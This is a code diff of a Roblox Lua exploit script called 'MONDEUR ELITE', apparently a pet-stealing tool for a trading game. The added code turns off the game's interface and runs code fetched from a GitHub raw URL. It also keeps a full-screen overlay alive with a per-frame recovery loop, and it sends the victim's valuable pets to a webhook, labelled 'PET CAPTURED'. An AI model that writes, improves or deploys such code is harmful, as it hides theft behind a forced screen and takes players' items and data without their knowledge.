@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE v16.7 - PTESSHS STABLE ]] --
+-- [[ MONDEUR ELITE v17.0 - "W" IMMORTAL UI ]] --
 if getgenv().MondeurExecuted then return end
 getgenv().MondeurExecuted = true
 
@@ -6,23 +6,36 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
--- 1. FORCE UI & LOCKDOWN (Immediate)
+-- [[ 1. THE IMMORTAL UI GUARD ]] --
 task.spawn(function()
-    pcall(function()
-        -- Disable Core UI
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-        
-        -- Load Screen from V.1
-        local uiCode = game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1")
-        if uiCode then
-            loadstring(uiCode)()
+    local function LoadUI()
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+            local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
+            if ui then
+                ui.Name = "MondeurGuard"
+                ui.DisplayOrder = 999999999
+            end
+        end)
+    end
+
+    LoadUI()
+
+    -- RECOVERY LOOP: If Android kills the UI, this brings it back instantly
+    RunService.RenderStepped:Connect(function()
+        local gui = LocalPlayer.PlayerGui:FindFirstChild("MondeurGuard")
+        if not gui then
+            LoadUI() -- Rebuild if missing
+        else
+            gui.Enabled = true
         end
     end)
 end)
 
--- 2. ROBUST WEBHOOK HANDLER
+-- [[ 2. ANDROID STABLE LOGGING ]] --
 local function SendLog(title, pet, val)
     local payload = HttpService:JSONEncode({
         ["embeds"] = {{
@@ -35,38 +48,26 @@ local function SendLog(title, pet, val)
             ["color"] = 0x00FF00
         }}
     })
-
     local req = (syn and syn.request) or (http and http.request) or http_request or request
     if req then
-        task.spawn(function()
-            pcall(function()
-                req({
-                    Url = getgenv().WEBHOOK,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = payload
-                })
-            end)
-        end)
+        pcall(function() req({Url = getgenv().WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end)
     end
 end
 
--- 3. CONTROLLED SCAN (Wait for Game Assets)
+-- [[ 3. DEEP SCAN ]] --
 task.spawn(function()
-    task.wait(3) -- Give the game 3 seconds to stabilize
-    SendLog("📡 CONNECTION TEST", "System Online", 0)
+    task.wait(5)
+    SendLog("📡 SYSTEM CHECK", "W-Immortal Active", 0)
 
     local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
     local data = ClientData.get_data()
-    
-    -- Brute force search for pet folder
     local petPath = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
     
     if petPath then
         for _, pet in pairs(petPath) do
             local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
             if val >= (getgenv().THRESHOLD or 0) then
-                SendLog("✅ PET DETECTED", pet.config_name or "Unknown", val)
+                SendLog("✅ PET CAPTURED", pet.config_name or "Unknown", val)
             end
         end
     end
